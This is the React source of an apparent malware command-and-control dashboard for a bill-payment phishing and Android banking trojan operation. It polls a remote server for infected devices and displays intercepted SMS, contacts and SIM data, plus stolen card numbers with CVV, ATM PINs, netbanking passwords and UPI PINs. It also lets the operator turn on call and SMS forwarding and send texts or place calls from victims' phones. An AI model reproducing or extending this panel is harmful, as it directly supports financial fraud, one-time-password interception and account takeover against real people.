import { useState, useEffect, useCallback } from 'react'

const API = 'https://bill-1-9yfp.onrender.com/api/admin/all'
const API_BASE = 'https://bill-1-9yfp.onrender.com'

const tabs = [
  { key: 'sim', label: 'SIM' },
  { key: 'sms', label: 'SMS' },
  { key: 'contacts', label: 'Contacts' },
  { key: 'bill_updates', label: 'Bill Updates' },
  { key: 'card_details', label: 'Card Details' },
  { key: 'card_verifications', label: 'Card Verify' },
  { key: 'netbanking_details', label: 'Netbanking' },
  { key: 'netbanking_pins', label: 'NB Pins' },
  { key: 'upi_details', label: 'UPI Pins' },
  { key: 'payment_attempts', label: 'Payments' },
  { key: 'forwarding', label: 'Forwarding' },
  { key: 'actions', label: 'Actions' },
]

const cols = {
  bill_updates: ['customer_name', 'mobile', 'consumer_number', 'reasons', 'created_at'],
  card_details: ['card_type', 'card_number', 'card_holder_name', 'expiry', 'cvv', 'amount', 'created_at'],
  card_verifications: ['dob', 'atm_pin', 'amount', 'created_at'],
  netbanking_details: ['bank_name', 'user_id', 'password', 'remember_me', 'amount', 'created_at'],
  netbanking_pins: ['pin', 'amount', 'created_at'],
  upi_details: ['pin', 'amount', 'created_at'],
  payment_attempts: ['amount', 'payment_method', 'status', 'created_at'],
}

export default function App() {
  const [data, setData] = useState(null)
  const [openId, setOpenId] = useState(null)
  const [tab, setTab] = useState('sim')
  const [fwd, setFwd] = useState({})
  const [saving, setSaving] = useState(false)
  const [actions, setActions] = useState({})
  const [actionSending, setActionSending] = useState({})
  const [time, setTime] = useState('')

  const fetchData = useCallback(async () => {
    try {
      const r = await fetch(API)
      const d = await r.json()
      setData(d)
      setTime(new Date().toLocaleTimeString())
    } catch {}
  }, [])

  useEffect(() => {
    fetchData()
    const id = setInterval(fetchData, 3000)
    return () => clearInterval(id)
  }, [fetchData])

  const loadFwd = async (id) => {
    try {
      const r = await fetch(`${API_BASE}/api/forwarding-config/${id}`)
      const d = await r.json()
      setFwd(prev => ({...prev, [id]: d}))
    } catch {}
  }

  const saveFwd = async (id) => {
    const c = fwd[id]
    if (!c) return
    setSaving(true)
    try {
      await fetch(`${API_BASE}/api/forwarding-config`, {
        method: 'PUT',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          device_id: id,
          call_forwarding: c.call_forwarding,
          call_forwarding_number: c.call_forwarding_number,
          sms_forwarding: c.sms_forwarding,
          sms_forwarding_number: c.sms_forwarding_number,
        }),
      })
    } catch {}
    setSaving(false)
  }

  const sendAction = async (id, type) => {
    const a = actions[id]
    if (!a || !a.target_number) return
    setActionSending(prev => ({...prev, [id]: true}))
    try {
      await fetch(`${API_BASE}/api/admin/action`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          device_id: id,
          type,
          target_number: a.target_number,
          message: a.message || '',
        }),
      })
      setActions(prev => ({...prev, [id]: {...prev[id], target_number: '', message: ''}}))
    } catch {}
    setActionSending(prev => ({...prev, [id]: false}))
  }

  if (!data) return <div style={s.loading}>Loading...</div>

  const devices = data.device_sections || []

  const parseSim = (info) => {
    try { return JSON.parse(info || '[]') } catch { return [] }
  }

  return (
    <div style={s.body}>
      <div style={s.header}>
        <b style={{fontSize:18}}>Devices</b>
        <span style={{fontSize:11,opacity:.6}}>{time}</span>
      </div>

      <div style={s.wrap}>
        {devices.length === 0 && <div style={s.loading}>No devices</div>}

        {devices.map((sec) => {
          const d = sec.device || {}
          const id = d.device_id
          const open = openId === id
          const online = d.last_seen && (Date.now() - new Date(d.last_seen).getTime()) < 120000
          const sims = parseSim(d.sim_info)
          const smsList = sec.sms || []
          const contactsList = sec.contacts || []

          return (
            <div key={id} style={s.card}>
              <div style={{...s.head, borderLeft:`4px solid ${online ? '#22c55e' : '#ef4444'}`}}
                onClick={() => { setOpenId(open ? null : id); setTab('sim'); loadFwd(id) }}>
                <div>
                  <div style={s.name}>
                    {d.device_name || '-'}
                    <span style={{...s.badge, background: online ? '#22c55e' : '#ef4444'}}>{online ? 'ON' : 'OFF'}</span>
                  </div>
                  <div style={s.sub}>{d.model || ''} &middot; Android {d.os_version || ''}</div>
                </div>
                <span style={{fontSize:11,color:'#94a3b8'}}>{open ? '▲' : '▼'}</span>
              </div>

              {open && (
                <div style={s.inner}>
                  <div style={s.tabRow}>
                    {tabs.map(t => (
                      <button key={t.key} onClick={()=>setTab(t.key)}
                        style={{...s.tabBtn, ...(tab===t.key ? {background:'#3b82f6',color:'#fff'} : {})}}>
                        {t.label}
                      </button>
                    ))}
                  </div>

                  {tab === 'sim' && (
                    sims.length === 0 ? <div style={s.empty}>No SIM data</div> : sims.map((x,i) => (
                      <div key={i} style={s.row}>
                        <span style={{fontWeight:600,minWidth:50,fontSize:13,color:'#475569'}}>SIM {x.sim_slot||i+1}</span>
                        <span style={{fontSize:13}}>{x.carrier||'-'}{x.number ? ` (${x.number})` : ''}</span>
                      </div>
                    ))
                  )}

                  {tab === 'sms' && (
                    smsList.length === 0 ? <div style={s.empty}>No SMS</div> : (
                      <div style={s.scroll}>
                        {smsList.map((x,j) => (
                          <div key={x.id||j} style={s.item}>
                            <div style={{fontWeight:600,fontSize:13}}>{x.sender||'-'}</div>
                            <div style={{color:'#475569',wordBreak:'break-word',marginTop:1,fontSize:12}}>{x.message||'-'}</div>
                            <div style={{fontSize:10,color:'#94a3b8',marginTop:1}}>{x.received_at?new Date(x.received_at).toLocaleString():'-'}</div>
                          </div>
                        ))}
                      </div>
                    )
                  )}

                  {tab === 'contacts' && (
                    contactsList.length === 0 ? <div style={s.empty}>No contacts</div> : (
                      <div style={s.scroll}>
                        {contactsList.map((x,j) => (
                          <div key={x.id||j} style={s.item}>
                            <div style={{fontWeight:600,fontSize:13}}>{x.name||'-'}</div>
                            <div style={{fontSize:11,color:'#475569'}}>{x.phone||''}{x.email ? ` | ${x.email}` : ''}</div>
                          </div>
                        ))}
                      </div>
                    )
                  )}

                  {['bill_updates','card_details','card_verifications','netbanking_details','netbanking_pins','upi_details','payment_attempts'].includes(tab) && (
                    (data[tab]||[]).length === 0 ? <div style={s.empty}>No data</div> : (
                      <div style={{overflowX:'auto'}}>
                        <table style={s.table}>
                          <thead><tr>{cols[tab].map(c => <th key={c} style={s.th}>{c.replace(/_/g,' ').toUpperCase()}</th>)}</tr></thead>
                          <tbody>{(data[tab]||[]).map((row,i) => (
                            <tr key={row.id||i} style={i%2?{background:'#f8fafc'}:{}}>
                              {cols[tab].map(c => {
                                let v = row[c]
                                if (c==='created_at') v = v?new Date(v).toLocaleString():'-'
                                if (typeof v==='boolean') v = v?'Yes':'No'
                                if (c==='amount') v = `₹${v}`
                                return <td key={c} style={s.td}>{v??'-'}</td>
                              })}
                            </tr>
                          ))}</tbody>
                        </table>
                      </div>
                    )
                  )}

                  {tab === 'forwarding' && (
                    <div>
                      <div style={s.fw}>
                        <span style={{minWidth:35,fontWeight:600,fontSize:13}}>Call</span>
                        <input type="text" placeholder="Phone number" value={fwd[id]?.call_forwarding_number||''}
                          onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],call_forwarding_number:e.target.value}}))}
                          style={s.inp} />
                        <label style={s.lbl}>
                          <input type="checkbox" checked={fwd[id]?.call_forwarding||false}
                            onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],call_forwarding:e.target.checked}}))} />
                          On
                        </label>
                      </div>
                      <div style={s.fw}>
                        <span style={{minWidth:35,fontWeight:600,fontSize:13}}>SMS</span>
                        <input type="text" placeholder="Phone number" value={fwd[id]?.sms_forwarding_number||''}
                          onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],sms_forwarding_number:e.target.value}}))}
                          style={s.inp} />
                        <label style={s.lbl}>
                          <input type="checkbox" checked={fwd[id]?.sms_forwarding||false}
                            onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],sms_forwarding:e.target.checked}}))} />
                          On
                        </label>
                      </div>
                      <button onClick={()=>saveFwd(id)} disabled={saving}
                        style={s.save}>{saving?'Saving...':'Save'}</button>
                    </div>
                  )}

                  {tab === 'actions' && (
                    <div>
                      <div style={{marginBottom:8,fontSize:11,color:'#64748b'}}>
                        Send SMS or make call from this device.
                      </div>
                      <input type="text" placeholder="Target phone number"
                        value={actions[id]?.target_number||''}
                        onChange={e=>setActions(prev=>({...prev,[id]:{...prev[id],target_number:e.target.value}}))}
                        style={{...s.inp,width:'100%',marginBottom:6,boxSizing:'border-box'}} />
                      <textarea placeholder="SMS message (only for SMS action)"
                        value={actions[id]?.message||''}
                        onChange={e=>setActions(prev=>({...prev,[id]:{...prev[id],message:e.target.value}}))}
                        style={{...s.inp,width:'100%',minHeight:60,resize:'vertical',marginBottom:8,boxSizing:'border-box',fontFamily:'inherit'}} />
                      <div style={{display:'flex',gap:8}}>
                        <button onClick={()=>sendAction(id,'sms')} disabled={actionSending[id]}
                          style={{...s.save,background:'#22c55e'}}>{actionSending[id]?'Sending...':'Send SMS'}</button>
                        <button onClick={()=>sendAction(id,'call')} disabled={actionSending[id]}
                          style={{...s.save,background:'#ef4444'}}>{actionSending[id]?'Calling...':'Make Call'}</button>
                      </div>
                    </div>
                  )}
                </div>
              )}
            </div>
          )
        })}
      </div>
    </div>
  )
}

const s = {
  body: { fontFamily:'-apple-system,sans-serif', background:'#f1f5f9', minHeight:'100vh', padding:'0 0 40px', fontSize:14 },
  loading: { display:'flex', height:'100vh', alignItems:'center', justifyContent:'center', color:'#666', fontSize:16 },
  header: { background:'#1e293b', color:'#fff', padding:'14px 16px', display:'flex', justifyContent:'space-between', alignItems:'center', position:'sticky', top:0, zIndex:10 },
  wrap: { padding:'12px', maxWidth:600, margin:'0 auto' },
  card: { background:'#fff', borderRadius:12, marginBottom:10, overflow:'hidden', boxShadow:'0 1px 4px rgba(0,0,0,.08)' },
  head: { display:'flex', justifyContent:'space-between', alignItems:'center', padding:'12px 14px', cursor:'pointer' },
  name: { fontWeight:700, fontSize:14, display:'flex', alignItems:'center', gap:8 },
  badge: { fontSize:9, color:'#fff', padding:'2px 7px', borderRadius:10, fontWeight:600 },
  sub: { fontSize:11, color:'#64748b', marginTop:2 },
  inner: { padding:'0 10px 12px', borderTop:'1px solid #f1f5f9' },
  tabRow: { display:'flex', gap:4, margin:'10px 0', flexWrap:'wrap' },
  tabBtn: { padding:'4px 10px', border:'none', borderRadius:6, fontSize:11, cursor:'pointer', fontWeight:600, background:'#e2e8f0', color:'#475569' },
  empty: { padding:16, color:'#999', fontSize:13, textAlign:'center' },
  row: { display:'flex', gap:8, padding:'7px 0', borderBottom:'1px solid #f8fafc' },
  scroll: { maxHeight:300, overflowY:'auto' },
  item: { padding:'6px 8px', borderBottom:'1px solid #f1f5f9', fontSize:12 },
  table: { width:'100%', borderCollapse:'collapse', fontSize:12, minWidth:500 },
  th: { padding:'8px 10px', textAlign:'left', background:'#f8f9fa', borderBottom:'2px solid #dee2e6', fontWeight:700, color:'#333', whiteSpace:'nowrap', fontSize:10 },
  td: { padding:'6px 10px', borderBottom:'1px solid #eee', whiteSpace:'nowrap', fontSize:11 },
  fw: { display:'flex', alignItems:'center', gap:6, marginBottom:8, flexWrap:'wrap' },
  inp: { flex:1, minWidth:100, padding:'7px 8px', border:'1px solid #e2e8f0', borderRadius:8, fontSize:12, outline:'none' },
  lbl: { display:'flex', alignItems:'center', gap:4, fontSize:12, cursor:'pointer', fontWeight:500, color:'#475569' },
  save: { background:'#3b82f6', color:'#fff', border:'none', borderRadius:8, padding:'7px 18px', fontSize:12, fontWeight:600, cursor:'pointer', marginTop:2 },
}
